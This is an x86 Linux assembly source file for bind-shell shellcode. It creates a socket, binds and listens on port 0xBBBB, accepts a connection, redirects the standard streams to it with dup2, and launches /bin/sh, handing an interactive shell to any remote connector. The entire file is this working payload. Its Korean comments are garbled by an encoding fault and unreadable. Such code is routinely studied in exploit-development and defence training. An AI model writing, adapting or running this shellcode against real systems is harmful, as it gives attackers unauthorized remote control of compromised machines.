BITS 32
section .text
global _start
_start:
xor eax,eax	; eax Ŭ����
xor ebx,ebx	; ebx Ŭ����
xor edx,edx	; edx Ŭ����

;server=socket(2,1,0)
push	eax	; socket�� ���� �� ��° �μ�: 0
push	byte 0x1; socket�� ���� �� ��° �μ�: 1
push	byte 0x2; socket�� ���� ù ��° �μ�: 2
mov	ecx,esp	; �迭�� �ּҸ� socketcall�� �� ��° �μ��� ����
inc	bl		; socketcall�� ù ��° �μ��� # 1�� ����
mov	al,102	; socketcall # 1 ȣ��: SYS_SOCKET
int	0x80	; Ŀ�� ���� ����, syscall ȣ��
mov	esi,eax	; ��ȯ��(eax)�� esi(server)�� ����

;bind(server,(struct sockaddr *)&serv_addr,0x10)
push	edx		; ���� 0��, Ǫ�õ� ���� �� �ʱ�ȭ
push	long 0xBBBB02BB	; ����ü �����:port,sin.family:02,& any 2bytes:BB
mov	ecx,esp		; ���ÿ� �ִ� addr ����ü�� ecx�� �̵�
push	byte  0x10	; ���ε� �μ� ����, 16(ũ��)�� ���ÿ� Ǫ��
push	ecx		; ����ü�� �ּҸ� ���ÿ� ����
push	esi		; ���� ���� �����(������ esi�� �ִ�)�� ���ÿ� ����
mov	ecx,esp		; �迭�� �ּҸ� socketcall�� ���� �� ��° �μ��� ����
inc	bl			; bl�� # 2�� ����, socketcall�� ù ��° �μ�
mov	al,102		; socketcall # 2 ȣ��: SYS_BIND
int	0x80		; Ŀ�� ���� ����, syscall ȣ��

;listen(server, 0)
push	edx		; ���� 0��, Ǫ�õ� ���� �� �ʱ�ȭ�� ���
push	esi		; ���� ���� �����(esi)�� ���ÿ� ����
mov	ecx,esp		; �迭�� �ּҸ� socketcall�� ���� �� ��° �μ��� ����
mov	bl,0x4		; 4�� bl�� �̵�, socketcall�� ù ��° �μ�
mov	al,102		; socketcall #4 ȣ��: SYS_LISTEN
int	0x80		; Ŀ�� ���� ����, syscall ȣ��

;client=accept(server, 0, 0)
push	edx	; ���� 0��, �� ��° �μ��� ���ÿ� Ǫ��
push	edx	; ���� 0��, �� ��° �μ��� ���ÿ� Ǫ��
push	esi	; ����� ���� ���� ����ڸ� ���ÿ� Ǫ��
mov	ecx,esp	; �μ��� ecx�� ����, socketcall�� ���� �� ��° �μ��� ��
inc	bl		; bl�� 5�� ����, socketcall�� ù ��° �μ�
mov	al,102	; socketcall #5 ȣ��: SYS_ACCEPT
int	0x80	; Ŀ�� ���� ����, syscall ȣ��

; dup2 ��� �غ�, ebx�� ����� Ŭ���̾�Ʈ ���� �ڵ��� �ʿ���
mov	ebx,eax	; ��ȯ�� Ŭ���̾�Ʈ ���� ����ڸ� ebx�� ����

;dup2(client, 0)
xor	ecx,ecx	; ecx �ʱ�ȭ
mov	al,63	; syscall�� ù ��° �μ��� 0x63�� ����: dup2
int	0x80	; ����

;dup2(client, 1)
inc	ecx		; ecx�� 1�� ����
mov	al,63	; dup2:63�� ���� syscall �غ�
int	0x80	; ����

;dup2(client, 2)
inc	ecx		; ecx�� 2�� ����
mov	al,63	; dup2:63�� ���� syscall �غ�
int	0x80	; ����

;standard execve("/bin/sh"...
push edx
push long 0x68732f2f
push long 0x6e69622f
mov	ebx,esp
push	edx
push	ebx
mov	ecx,esp
mov	al, 0x0b
int 0x80
